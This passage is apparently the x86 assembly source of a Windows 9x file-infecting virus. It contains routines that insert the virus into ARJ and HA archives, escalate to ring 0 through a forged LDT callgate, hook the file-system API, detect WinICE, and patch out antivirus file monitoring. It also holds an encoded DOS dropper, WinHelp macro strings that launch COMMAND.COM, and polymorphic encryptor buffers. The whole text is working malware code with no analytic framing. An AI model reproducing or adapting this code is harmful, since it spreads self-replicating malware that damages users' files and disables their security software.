           STOSB
           MOV EAX,4 PTR [ESI.ARJ_VER_NUM]
           STOSD
           AND 1 PTR [EDI-1],10H
           MOV EAX,4 PTR [ESI.ARJ_FILE_TIME]
           XOR AL,AL
           MOV [EDI+3],EAX
   SKIP_EXE_ARJ:   MOVZX   EAX,[ESI.ARJ_BAS_HDR_SIZE]
           ADD EAX,8
   NEXT_ARJ_EXT:   PUSH    2
           POP ECX
           CALL    ZIP_READ_FILE
           JB  EXIT_ARJ
           CMP AX,[ESI]
           XCHG    EAX,ECX
           JE  END_ARJ_EXT
           ADD AX,[ESI]
           ADD EAX,4
           JMP NEXT_ARJ_EXT
   END_ARJ_EXT:    CMP [ESI.ARJ_FILE_TYPE],1
           JA  GO_READ_ARJ_FH
           ADD EAX,[ESI.ARJ_COMPRESSED_SIZE]
   GO_READ_ARJ_FH: JMP READ_ARJ_FH
   ARJ_DONE:   CALL    CHECK_ARCOUNT
           JB  EXIT_ARJ
           PUSH    ESI ECX
           LEA ESI,OUR_ARJ_FHEADER[EDX+4]
           MOV [ESI.ARJ_COMPRESSED_SIZE-4],ECX
           MOV [ESI.ARJ_ORIGINAL_SIZE-4],ECX
           MOV [ESI.ARJ_CRC32-4],EAX
           MOV ECX,12345678H
           GOFF    OUR_ARJ_FH_LEN,4
           CALL    GET_CRC32
           MOV [ESI+ECX],EAX
           ADD ECX,10
           SUB ESI,4
           CALL    ZIP1_INSERT_FILE
           POP ECX ESI
           JNB SET_INSERT
   EXIT_ARJ:   RETN

   ;------------------------------------------------
           GOFF    INF_HA
           CMP [ESI.HA_M_SIGN],HA_SIGN
           JNE EXIT_ARJ
           CMPSD               ;ADD    ESI,SIZE HA_MAIN_HEADER
           INC 2 PTR [ESI-2]       ;INC    2 PTR [ESI.HA_M_FILE_CNT]
           MOV AL,4
   READ_HA_FH: XOR ECX,ECX
           MOV CL,SIZE HA_FILE_HEADER+MAX_DOS_PATH
           CALL    ZIP_READ_FILE
           JNB HA_READ_OK
           ADD ECX,EAX
           JNB EXIT_ARJ
           JE  HA_DONE
   HA_READ_OK: AND [ESI.HA_VER_METHOD],0FH
           JNE NO_INF_HA
           CMP DL,1 PTR [ESI.HA_FILE_TIME]
           JE  EXIT_ARJ
   NO_INF_HA:  LEA EDI,[ESI.HA_PATH]
           SUB ECX,LARGE 4 PTR HA_PATH
           JB  EXIT_ARJ
           XOR EAX,EAX
           REPNE   SCASB
           JNE EXIT_ARJ
           REPNE   SCASB
           JNE EXIT_ARJ
           LEA ECX,[EDI-1]
           MOV AL,[EDI]
           INC EAX
           SUB EDI,ESI
           ADD EDI,EAX
           PUSH    EDI
           CMP [ESI.HA_VER_METHOD],0EH
           JE  SKIP_EXE_HA
           INC 4 PTR ZIP_FILE_COUNTER[EDX]
           MOV AH,[ECX+2]
           PUSH    ESI
           LEA ESI,[ESI.HA_PATH]
           SUB ECX,ESI
           LEA EDI,OUR_HA_FHEADER.HA_PATH[EDX]
           PUSH    EAX EAX LARGE 0
           CALL    TEST_EXEC_SPEC
           POP EAX
           LEA EDI,[ESI+ECX+1]
           POP ESI
           JB  SKIP_EXE_HA
           MOV AL,2
           STOSW
           LEA EDI,OUR_HA_FHEADER[EDX]
           ADD ECX,SIZE HA_FILE_HEADER+3
           MOV OUR_HA_FH_LEN[EDX],ECX
           MOV AL,HA_STORED
           STOSB
           MOV EAX,4 PTR [ESI.HA_FILE_TIME]
           XOR AL,AL
           MOV 4 PTR [EDI.HA_FILE_TIME-1],EAX
   SKIP_EXE_HA:    POP EAX
           ADD EAX,[ESI.HA_COMPRESS_SIZE]
           JMP READ_HA_FH
   HA_DONE:    CALL    CHECK_ARCOUNT
           JB  EXIT_HA
           PUSH    ESI ECX
           LEA ESI,OUR_HA_FHEADER[EDX]
           MOV [ESI.HA_COMPRESS_SIZE],ECX
           MOV [ESI.HA_ORIGINAL_SIZE],ECX
           MOV [ESI.HA_CRC32],EAX
           MOV ECX,12345678H
           GOFF    OUR_HA_FH_LEN,4
           CALL    ZIP1_INSERT_FILE
           POP ECX ESI
           JB  EXIT_HA
           CALL    ZIP1_INSERT_FILE
           LEA ESI,HEADER[EDX]
           PUSH    4
           POP ECX
           JNB SET_WRITE_FILE
   EXIT_HA:    RETN

   ;------------------------------------------------
   GET_WININIT:    LEA ESI,WININIT_INI[EDX]
           MOV CL,LEN_WININIT_INI
   ;ENTRY: ESI=&FILENAME,CL=STRLEN(ESI)+1
   ;EXIT: ESI=&FULLNAME
   CONCAT_WINDIR:  MOVZX   ECX,CL
           LEA EDI,TMP_PATH[EDX]
           PUSH    EDI ESI
           MOV ESI,[EDI-SYS_PATH_DELTA]
   COPY_SYS_PATH:  MOVSB
           CMP DL,[ESI]
           JNE COPY_SYS_PATH
           POP ESI
           REP MOVSB
           MOV [EDI],CL
           POP ESI
           RETN

   ;------------------------------------------------
   ;ENTRY: ON STACK - DWORD OF VXD
           GOFF    CLI_VXD_CALL
           CLI
           GOFF    OFF_VXD_CALL
   VXD_CALL    PROC
           PUSH    EAX
           LEA EAX,[EBP-6]
           MOV 2 PTR [EAX],1234H
           ORG $-2
           INT 20H
           XCHG    EAX,[ESP+4]
           XCHG    EAX,[ESP+8]
           MOV [EBP-4],EAX
           POP EAX
           RET
           ENDP

   ;------------------------------------------------
   OPEN_CREATE:    XOR ECX,ECX
           PUSH    ACTION_CREATEALWAYS
           POP EDX
           MOV BX,OPEN_FLAGS_COMMIT OR OPEN_FLAGS_NOCRITERR OR \
               ACCESS_WRITEONLY OR OPEN_SHARE_DENYREADWRITE
           JMP GO_OPEN_CREATE
   OPEN_FILE_RO:   MOV BL,OPEN_ACCESS_RO_NOMODLASTACCESS OR OPEN_SHARE_DENYWRITE
   ;BL=METHOD
   OPEN_FILE:  XOR EDX,EDX
           INC EDX         ;FILE_OPEN
           MOV BH,OPEN_FLAGS_NOCRITERR SHR 8
   GO_OPEN_CREATE: MOV AX,R0_OPENCREATFILE
           JMP FILE_IO

   ;------------------------------------------------
   GET_ATTRIBUTES: MOV AL,FGET_ATTRIBUTES
           CMP EAX,12345678H
           ORG $-4

   ;------------------------------------------------
   CLR_ATTRIBUTES: XOR ECX,ECX
   SET_ATTRIBUTES: MOV AL,FSET_ATTRIBUTES

   ;------------------------------------------------
   MAN_ATTRIBUTES: MOV AH,R0_FILEATTRIBUTES SHR 8
           CMP EAX,12345678H
           ORG $-4

   ;------------------------------------------------
   CLOSE_FILE: MOV AX,R0_CLOSEFILE

   ;------------------------------------------------
   FILE_IO:    MOVZX   EAX,AX
           PUSH    RING0_FILEIO
   GO_VXD_CALL:    CALL    VXD_CALL
           RETN

   ;------------------------------------------------
   DELETE_FILE:    MOV CL,27H          ;ALL ATTRIBUTES
           MOV AX,R0_DELETEFILE
           JMP FILE_IO

   ;------------------------------------------------
   GET_SYS_TIME:   PUSH    GET_SYSTEM_TIME
           JMP GO_VXD_CALL

   ;------------------------------------------------
   GETSIZE_FILE:   MOV AX,R0_GETFILESIZE
           JMP FILE_IO

   ;------------------------------------------------
   IAPI_HOOKER PROC
           GOFF    OFF_IAPI_HOOKER
           BREAK
           PUSHAD
           ENTERD  STACK_FRAME,0       ;FOR VXD_CALL
           CALL    CALC_DELTA
           PUSH    4 PTR OLD_IFS_HOOKER[EDX]
           POP 4 PTR [EBP+4+7*4]   ;EAX
           CALL    TEST_VXD
           JE  IAPI_EXIT
           LEA EAX,OFF_IFS_HOOKER[EDI]
           PUSH    EAX
           CALL    4 PTR OLD_RAPI_HOOKER[EDI] ;REMOVE OUR API HOOKER
           PUSH    4 PTR [EBP+4+8*4+4] ;1ST PARAMETER
           MOV ESI,12345678H
           GOFF    OLD_IAPI_HOOKER,4
           CALL    ESI         ;INSTALL NEW API HOOKER
           MOV [EBP+4+7*4],EAX     ;EAX
           POP EAX
           CALL    ESI         ;REINSTALL OUR API HOOKER
           MOV OLD_IFS_HOOKER[EDI],EAX
   IAPI_EXIT:  LEAVED
           POPAD
           RET
           ENDP

   ;------------------------------------------------
   RAPI_HOOKER PROC
           GOFF    OFF_RAPI_HOOKER
           BREAK
           PUSHAD
           ENTERD  STACK_FRAME,0       ;FOR VXD_CALL
           CALL    CALC_DELTA
           CALL    TEST_VXD
           JNE RAPI_EXIT
           LEA EAX,RAPI_RET_ADDRESS[EDI]
           MOV [EAX+1],EDX     ;STORE ORIGINAL RETURN ADDRESS
           MOV [EBP+4+8*4],EAX     ;RETURN ADDRESS
   RAPI_EXIT:  LEAVED
           POPAD
           PUSH    12345678H
           GOFF    OLD_RAPI_HOOKER,4
           RET
           GOFF    RAPI_RET_ADDRESS
           PUSH    12345678H       ;+1 ORIGINAL RETURN ADDRESS
           XOR EAX,EAX
           RET
           ENDP

   ;------------------------------------------------
   TEST_VXD:   MOV EAX,[EBP+4+8*4]     ;RETURN ADDRESS
           MOV EDI,EDX

   TEST_VXD_HOOK:  LEA ESI,VXD_NAME[EDI]   ;EAX = CHECKING ADDRESS
           PUSH    ESI EAX
           PUSH    _GETVXDNAME
           CALL    VXD_CALL
           POP EDX ECX
   VXDCMP_ONLY:    CMP 4 PTR [ESI],'59KG'  ;GK95?
           JE  IS_AVXD
           CMP 4 PTR [ESI],'DIPS'  ;SPIDER?
   IS_AVXD:    RETN

   ;------------------------------------------------
   IO_CALLBACK PROC
   ;ENTRY: ECX - IN(OUT)PUT TYPE (IGNORE OTHER DATA STRUC)
   ;EXIT: EAX - PORT DATA
           GOFF    OFF_IO_CALLBACK
           BREAK
           AND ECX,ECX         ;BYTE_INPUT?
           JNE IS_NO_ME
           MOV AL,WE_HERE      ;WE'RE HERE!
   IS_NO_ME:   RET
           ENDP

   ;------------------------------------------------
   GET_RANDOM_MSK: MOV AL,'Z'-'A'-14

   ;------------------------------------------------
   GET_RANDOM_BYTE: MOVZX  EAX,AL

   ;------------------------------------------------
   ;ENTRY: EAX=(LIMIT-1) OR EAX=0 IF INFINITY,EDX=CODE DELTA IN MEMORY
   ;EXIT: EAX=RANDOM VALUE, ZF=1 IF ZERO
   GET_RANDOM  PROC
           PUSH    EDX EAX EDX
           MOV EAX,12345678H
           GOFF    RANDOMIZE,4
           MOV EDX,3A7FDH
           MUL EDX
           POP EDX
           ADD EAX,269EC3H
           MOV 4 PTR RANDOMIZE[EDX],EAX
           POP EDX
           AND EDX,EDX
           JE  NO_LIMIT
           MUL EDX
           XCHG    EAX,EDX
   NO_LIMIT:   AND EAX,EAX
           POP EDX
           RET
           ENDP

   ;------------------------------------------------
   FIND_FREE_SEL   PROC
           CMP EBX,[EDI]       ;EBX=0,EDI=LDT CUR POS
           JNE NO_FREE_SEL
           CMP EBX,[EDI+4]
           JE  FREE_SEL
   NO_FREE_SEL:    SCASD
           SCASD
           CMP EDI,ECX
           JB  FIND_FREE_SEL
           STC
           RET
   FREE_SEL:   MOV EAX,EDI
           SUB EAX,ESI         ;ESI=LDT LINEAR ADDRESS
           OR  AL,111B         ;LDT/RPL=3
           RET
           ENDP

   ;------------------------------------------------
           GOFF    PE_OFF_R0_INSTALL
   RING0_INSTALL   PROC    FAR
           BREAK
           CLI
           LEA ESI,OLD_PECODE[EDX]
           MOV CL,LEN_LOADER
           REP MOVSB
           CMP AL,WE_HERE
           JNE MAKE_INSTALL
           STI
           RET

   ;------------------------------------------------
           GOFF    OFF_R0_INSTALL
   MAKE_INSTALL:   BREAK
           CLI
           PUSH    ES DS SS SS
           POP DS ES
           ENTERD  STACK_FRAME,0
           CALL    CALC_DELTA
           MOV ESI,EDX
           LEA EDI,[ESI+CLI_VXD_CALL]
           MOV EAX,WINICE_ID
           MOV EBX,GET_DDB     ;18146H
           PUSH    EBX
           CALL    EDI
           AND ECX,ECX
           IFNDEF  DEBUG
           JS  GO_ERROR        ;TEST IF WINICE INSTALLED
           ENDIF
           MOV BL,_PAGERESERVE AND 0FFH ;1811DH
           PUSH    PR_FIXED LARGE TOTAL_PAGE_NUM PR_SYSTEM EBX
           CALL    EDI         ;RESERVE MEMORY PAGES
           INC EBX         ;_PAGECOMMIT=1811EH
           AND AL,AL
   GO_ERROR:   JS  ERROR
           XCHG    EAX,EBX
           XCHG    EDI,EBX
           CDQ
           PUSH    PC_WRITEABLE OR PC_FIXED EDX PD_FIXEDZERO LARGE TOTAL_PAGE_NUM
           SHLD    EDX,EDI,20
           PUSH    EDX EAX
           CALL    EBX         ;COMMIT RESERVED MEMORY PAGES
           CMP EAX,1
           JB  GO_FREE_PAGE
           PUSH    EDI
           MOV ECX,OUR_LEN
           REP MOVSB
           POP EDI
           LEA ESI,[EDI+OFF_IO_CALLBACK]
           MOV EDX,OUR_PORT
           PUSH    INSTALL_IO_HANDLER
           CALL    EBX         ;HOOK PORT
   GO_FREE_PAGE:   JB  FREE_PAGE
           MOV EDX,EDI
           CALL    SET_TIME        ;INIT FIRST INF_TIME
           PUSH    GET_DATE_AND_TIME
           CALL    EBX
           ADD RANDOMIZE[EDI],EAX  ;INIT RANDOMIZE
           PUSH    GET_CONFIG_DIRECTORY
           CALL    EBX         ;STORE &%WINDIR%
           MOV SYS_PATH[EDI],EDX
           LEA EAX,OFF_IFS_HOOKER[EDI]
           PUSH    EAX INSTALLAPIHOOK
           CALL    EBX         ;HOOK FILESYSTEMAPI
           MOV OLD_IFS_HOOKER[EDI],EAX
           MOV ECX,[EBP-4]
           LEA EDX,OFF_IAPI_HOOKER[EDI]
           XCHG    EDX,[ECX]       ;HOOK INSTALLFILESYSTEMAPIHOOK
           MOV OLD_IAPI_HOOKER[EDI],EDX
   SCAN_CHAIN: PUSH    EAX
           MOV EAX,[EAX]
           CALL    TEST_VXD_HOOK
           POP EDX
           XCHG    EAX,ECX
           JECXZ   NO_VXD_MEM
           MOV EAX,[EDX+4]
           LEA EAX,[EAX+4]
           JNE NO_AV_HOOKER
           MOV ECX,[EDX]
           MOV 2 PTR [ECX],1234H   ;DISABLE AV FILE MONITORING
           ORG $-2
           JMP 4 PTR DS:[12345678H]
           ORG $-4
           MOV [ECX+2],EAX
   NO_AV_HOOKER:   CMP 4 PTR [ESI],'MSFI'  ;IFSMGR?
           JNE SCAN_CHAIN
   NO_VXD_MEM: LEA ESI,OFF_RAPI_HOOKER[EDI]
           MOV EAX,REMOVEAPIHOOK AND 0FFFF7FFFH
           PUSH    HOOK_DEVICE_SERVICE
           CALL    EBX         ;HOOK REMOVEFILESYSTEMAPIHOOK
           MOV OLD_RAPI_HOOKER[EDI],ESI
           JMP ERROR
   FREE_PAGE:  PUSH    0 EDI _PAGEFREE
           CALL    EBX
   ERROR:      LEAVED
           POP DS ES
           STI
           RET
           ENDP

   ;------------------------------------------------
   ;INIT DATA AREA

           GOFF    CHK_NT
   RELO_CHK_NT DB  "IF(NOT(FE(`C:\\"
           IFNDEF  DEBUG
           DB  "NTLDR"
           ELSE
           DB  "NTLD_"
           ENDIF
           DB  ".')),`"
   LEN_CHK_NT  =   $-RELO_CHK_NT
           GOFF    RR_MACRO
           DB  'RR("KERNEL32","Sleep","U")',"')",0
           GOFF    DROP_MACRO
           DB  "EF(`COMMAND.COM',",'"/CECHO ',0
           GOFF    SLEEP_MACRO
           DB  "Sleep(550)')",0
           GOFF    EXEC_MACRO_1
           DB  "EF(`",0
   EXEC_2      DB  "',qchPath,0)')"
   LEN_EXEC_2  =   $-EXEC_2

   ;DOSDROP.COM START
           GOFF    RUN_DROPPER
   RUN_DROPPER_LB  DB  58H,2CH,53H,50H,5EH,6AH,21H,5BH,68H,51H,40H,58H,28H,40H,6CH,28H,40H,6DH
           DB  30H,40H,6EH,28H,40H,70H,28H,40H,73H,28H,40H,76H,28H,40H,76H,28H,40H,7DH
           DB  50H,5FH,2CH,31H,6CH,6AH,44H,58H,34H,40H,50H,59H,68H
   UU_MASK     =   $-RUN_DROPPER_LB
           DW  'AA'
           DB  58H,56H,5FH,29H,40H,7EH,72H,5EH,23H,31H,7FH,24H,40H,7EH,50H,70H,7EH,31H
           DB  41H,7EH,47H,46H,46H,79H,3BH
   LEN_UUD     =   $-RUN_DROPPER_LB

           GOFF    RDROP_CON
   RDROP_CON_LB    DB  0BEH,80H,0,0ACH,98H,93H,88H,38H,0ACH,3CH,20H,74H,0FBH,4EH,0BBH,24H,20H
           DB  0BAH,1,0,0E8H,6FH,0,0B1H,10H,0E8H,63H,0,8BH,54H,26H,8BH,4CH,28H,0B8H,0
           DB  42H,50H,0CDH,21H,59H,0E8H,53H,0,50H,91H,8BH,0FAH,0B8H
           GOFF    FIRST_DROP_MASK
   OFF_MASK1   DW  1234H
           DB  31H,5,5
           GOFF    SECOND_DROP_MASK
   RELO_MASK2  =   $-OFF_MASK1
           DW  1234H
           DB  47H,0E2H,0F8H,0B4H,3EH,0CDH,21H,0BBH,11H,60H,0BAH,12H,0,0E8H,3EH,0,59H
           DB  0B4H,40H,0E8H,33H,0,0B4H,3EH,0CDH,21H,0BCH,9,4,0B3H,41H,0B4H,4AH,0CDH
           DB  21H,0BBH,0EBH,1,8CH,4FH,4,8CH,4FH,8,8CH,4FH,0CH,0B8H,0,4BH,56H,0E8H,0CH
           DB  0,0EH,17H,0BCH,7,4,0EH,1FH,5EH,6AH,0,0B4H,41H,8BH,0D6H,0CDH,21H,0C3H
           DB  0B4H,3FH,0BAH,0F9H,1,0EBH,0F6H,0F9H,0B8H,6CH,71H,0CDH,21H,0BEH,0DFH,1
           DB  72H,0E5H,93H,0C3H
           DB  'C:\'
           GOFF    RDROP_NAME
           DB  'ABCDE.COM'
           DB  0,0,80H,0,0,0,5CH,0,0,0,6CH,0
   LEN_RDROP_CON   =   $-RDROP_CON_LB
   ;DOSDROP.COM END

           GOFF    INF_PROCS
           DW  INF_EXE
           DW  INF_HLP
           DW  INF_RAR
           DW  INF_ZIP
           DW  INF_ARJ
           DW  INF_HA

           GOFF    COMMAND_PIF
   C_PIF_RELO  DB  'command.pif'
   LEN_COMMAND_PIF =   $-C_PIF_RELO
           GOFF    WININIT_INI
   W_INI_RELO  DB  'wininit.ini'
   LEN_WININIT_INI =   $-W_INI_RELO
           GOFF    SYSTEM_INI
   S_INI_RELO  DB  'system.ini'
   LEN_SYSTEM_INI  =   $-S_INI_RELO

   ;------------------------------------------------
   ;ENTRY POINT HERE FOR PE-FILES
           GOFF    PE_INSTALL_POP
           SUB 4 PTR [ESP],1234H   ;FOR CALL
           GOFF    ENCRYPTOR_LEN,4
           POP 4 PTR [ESP+INTRUD_OFF]

           GOFF    PE_INSTALL
   GATE_ADDR   =   6 PTR [EBP-6]
           ENTERD  6,0         ;FOR JMP
           PUSHFD
           PUSHAD
           CLD
           CALL    SET_SEH
   PROCESS_SEH:    POP ECX ECX ESP     ;ESTABLISHERFRAME (+8)
   EXIT:       XOR ECX,ECX
           POP 4 PTR FS:[ECX]      ;REMOVE OUR EXCEPTION HANDLER
           POP EBX
           CMP CL,[EBX+RW_LOCAL_RELO]
           JE  NO_REST_HOST
           MOV CL,LEN_LOADER
           MOV EDI,[EBX+IOFF_LOCAL_RELO]
           LEA ESI,[EBX+ECX+OLDP_LOCAL_RELO-LEN_LOADER]
           REP MOVSB
   NO_REST_HOST:   POPAD
           POPFD
           LEAVED
           GOFF    RESTORE_REGS
           DB  LEN_FILL_RESTORE DUP (90H) ;(MOV DREG,[ESP+XXXXXXXX])[4]
           PUSH    12345678H
           GOFF    INTRUD_OFF,4
   IOFF_LOCAL_RELO =   $-PROCESS_SEH-4
           RET 1234H
           GOFF    COUNT_RET,2
   SET_SEH:    XOR EBX,EBX
           PUSH    4 PTR FS:[EBX]
           MOV FS:[EBX],ESP        ;SET OUR EXCEPTION HANDLER
           SLDT    CX
           JECXZ   EXIT            ;NO LDT? (WIN NT)
           MOV DX,OUR_PORT
           IN  AL,DX
           CMP AL,WE_HERE      ;WE'RE ALREADY IN MEMORY?
           JE  $+2         ;EXIT
           GOFF    RW_OR_RO,1
   RW_LOCAL_RELO   =   $-PROCESS_SEH-1
   RW_LOCAL_EXIT   =   $-EXIT-1
           PUSH    EAX
           SGDT    6 PTR [ESP-2]       ;FIND LDT LINEAR ADDRESS
           POP ESI
           PUSH    EAX
           MOV EDI,[ESI.ECX.1]
           MOV AL,[ESI.ECX.SEL_BASE_HIGH]
           MOV CX,[ESI.ECX.SEL_LIMIT_LOW]
           SHRD    EDI,EAX,8       ;GET LINEAR ADDRESS OF LDT
           MOV ESI,EDI
           ADD ECX,EDI         ;GET LIMIT OF LDT
           CALL    FIND_FREE_SEL       ;FIND NON-USED DESCRIPTOR
   GO_EXIT:    JB  EXIT
           PUSH    EDI EAX         ;FOR R0 CS
           CALL    NO_FREE_SEL
           POP EBX ESI ECX
   GO1_EXIT:   JB  GO_EXIT
           MOV 2 PTR SS:GATE_ADDR+4,AX ;AND FOR CALLGATE SELECTOR
           CALL    CALC_DELTA
           LEA EAX,PE_OFF_R0_INSTALL[EDX]
           PUSH    EDI
           STOSW               ;MAKE CALLGATE DESCRIPTOR
           SHR EAX,16
           MOV [EDI+4],AX
           XCHG    EAX,EBX
           STOSD
           MOV 1 PTR [EDI-1],11101100B ;P=1:DPL=3:S=0:TYPE=0CH (CALLGATE)
           MOV EDI,ESI         ;MAKE R0 CS DESCRIPTOR
           PUSH    EDI
           MOV AX,-1           ;LIMIT=0FFFFH
           STOSD
           MOV EAX,1100111110011010B SHL 8 ;G=1:32BIT:AVL=0:LIMIT=0FH
           STOSD               ;P=1:DPL=0:S=1:CODE:NONCONF:READ=1:NOACCESS
           XCHG    EAX,ECX
           MOV EDI,INTRUD_OFF[EDX]
           XOR ECX,ECX
           MOV CL,LEN_LOADER
           PUSH    EDI
   _SCASB:     SCASB               ;LOAD CODE PAGE(S) INTO MEMORY
           LOOP    _SCASB
           POP EDI
           CALL    GATE_ADDR
           POP EDI
           XOR EAX,EAX
           STOSD
           STOSD
           POP EDI
           STOSD
           STOSD
           STC
           JMP GO1_EXIT

           GOFF    OUR_LEN

   INIT_PAGE_NUM   =   (OUR_LEN+0FFFH)/1000H

   ;------------------------------------------------
   ;ZERO INITIALIZED DATA
           GOFF    ZERO_INIT
           GOFF    OLD_PECODE
   OLDP_LOCAL_RELO =   $-PROCESS_SEH
           DB  LEN_LOADER DUP (?)
           GOFF    SHELL_FLAG
   SHELL_FLAG_RELO DB  ?
           GOFF    SYS_PATH
   SYS_PATH_RELO   DD  ?
           GOFF    FLAG
           DD  ?       ;BIT 0 - REENTERING FLAG
   SYS_PATH_DELTA  =   $-SYS_PATH_RELO
   SHELL_FLAG_DELTA =  $-SHELL_FLAG_RELO
           GOFF    TMP_PATH
           DB  MAX_PATH DUP (?)

   AREA_COMMON_1:
           GOFF    SYS_FILE_HEADER
           FILE_HEADER <>
           SYSTEM_HEADER <>
           GOFF    BUFF4MACRO
           DB  (LEN_UUD+2*LEN_RDROP_CON) DUP (?)

           ORG AREA_COMMON_1
           GOFF    IO_BUFFER
           DB  LEN_IOBUFF DUP (?)

           ORG AREA_COMMON_1
           GOFF    OUR_ARJ_FHEADER
           ARJ_HDR_STRUC <>
           DB  MAX_PATH DUP (?)
           DB  8 DUP (?)

           ORG AREA_COMMON_1
           GOFF    OUR_HA_FHEADER
           HA_FILE_HEADER <>
           DB  MAX_DOS_PATH DUP (?)

           ORG AREA_COMMON_1
           GOFF    OUR_RAR_FHEADER
           RAR_FILE_HDR    <>
           DB  MAX_PATH DUP (?)

           ORG AREA_COMMON_1
   OUR_LOCAL_HEADER_RELO:
           GOFF    OUR_LOCAL_HEADER
           ZIP_LOCAL_HEADER <>
           DB  MAX_PATH DUP (?)
           GOFF    OUR_CENTRAL_HEADER
           ZIP_CENTRAL_HEADER <>
           DB  MAX_PATH DUP (?)
           GOFF    ZIP_CUR_OFF
           DD  ?
           GOFF    ZIP_CENTRAL_OFF
           DD  ?
           GOFF    ZIP_FILE_COUNTER
           DD  ?
           GOFF    ZIP_EXEC_FLAG
           DB  ?
   SIZE_ARC_AREA   =   $-OUR_LOCAL_HEADER_RELO
           GOFF    INSERT_BUFF
           DB  LEN_IOBUFF DUP (?)

   AREA_COMMON_2:
           GOFF    FIND_DATA
           _WIN32_FIND_DATA <>

           ORG AREA_COMMON_2
           GOFF    HLP_HEADER
           HLP_START <>
           GOFF    HLP_DIRECTORY
           DB  LEN_HLP_DIR DUP (?)

           ORG AREA_COMMON_2
           GOFF    BUFF_ZIP_HEADER
           ZIP_CENTRAL_HEADER <>
           DB  MAX_PATH DUP (?)

           ORG AREA_COMMON_2
           GOFF    HEADER
           DOS_HEADER <>
           GOFF    PHEADER
           PE_HEADER <>
           GOFF    OTABLE
           OBJECT_TABLE MAX_OBJS DUP (<>)

   AREA_COMMON_3:
           GOFF    PUSHED_REGS
           DW  ?
           DB  4 DUP (?)
           GOFF    SHIT_FLAG
           DB  ?
           GOFF    DIRTY_SREG
           DB  ?
           GOFF    DIRTY_WREG
           DB  ?
   ;XXX1XXXX (1-USED,0-UNUSED)
   ;       ^AX
   ;      ^CX
   ;     ^DX
   ;    ^BX
   ;  ^BP
   ; ^SI
   ;^DI
           GOFF    WREG_LIST
           DB  8 DUP (?)       ;VALID REGISTER LIST
   SPE_COMMON:
           GOFF    ADDRESS_MODE
           DW  ?           ;IF (HIBYTE)=0FFH THEN SHORT
           GOFF    OFF_VALUE
           DD  ?           ;OFFSET VALUE
           GOFF    DELTA_VALUE
           DD  ?           ;DELTA VALUE IN [OFF_REG+DELTA]
           GOFF    MASK_VALUE
           DD  ?           ;MASK VALUE
           GOFF    TOP_ADDRESS
           DD  ?           ;ADDRESS OF TOP DWORD
           GOFF    DEC_OFF_COUNT
           DB  ?           ;DECREMENT OFF_REG COUNTER
           GOFF    OFF_REG
           DB  ?           ;OFFSET REGISTER
           GOFF    COUNT_REG
           DB  ?           ;COUNTER REGISTER
           GOFF    MASK_REG
           DB  ?           ;MASK REGISTER
           GOFF    WORK_REG
           DB  ?           ;WORK REGISTER
           GOFF    STORE_WR_FLAG
           DB  ?           ;STORING WORK_REG FLAG
           GOFF    CHG_WR_FLAG
           DB  ?           ;CHANGING WORK_REG FLAG
           GOFF    SET_WR_FLAG
           DB  ?           ;SETTING WORK_REG FLAG
           GOFF    DEC_ESP_COUNT
           DB  ?           ;DECREMENT ESP COUNTER
           GOFF    WORD_MODE
           DB  ?           ;WORD (1) OR DWORD (0) MODE
           GOFF    SPE32_BUFF

           ORG SPE_COMMON
           GOFF    ADDRESS_EMPTY
           DW  ?
           GOFF    ADDRESS_BUFF
           DW  LEN_DECRYPTOR DUP (?)   ;BUFFER FOR ADDRESSES
           GOFF    LEN_SEEK
           DW  ?
           GOFF    SEEK_TABLE
           DB  LEN_DECRYPTOR+1 DUP (?) ;FOR CHOOSE DECRYPTOR BYTES
           GOFF    TEMP_DECRYPTOR
           DB  LEN_DECRYPTOR DUP (?)   ;TEMPORARY DECRYPTOR BUFFER
           GOFF    ENCRYPT_BUFF
           DB  LEN_MAIN_BUFF DUP (?)   ;WORK BUFFER

           GOFF    SET_ALIGN
   SET_ALIGN_NEW   =   (((SET_ALIGN+3) AND (NOT 3))-END_CODE16)
           ORG SET_ALIGN_NEW       ;ALIGN 4 (GLOBAL)

           GOFF    MAIN_BUFF
   IMM_MBUFF:
           DB  ((OUR_LEN+100H+1+LEN_LOADER+3)/4)*4 DUP (?) ;100H-MAX LENGTH OF END SHIT
   SIZE_MBUFF  =   $-IMM_MBUFF

           GOFF    VXD_NAME
           DB  MIN_VXDNAME_SIZE DUP (?)

           GOFF    TOTAL_LEN

   TOTAL_PAGE_NUM  =   (TOTAL_LEN+0FFFH)/1000H

           ENDS

           END START
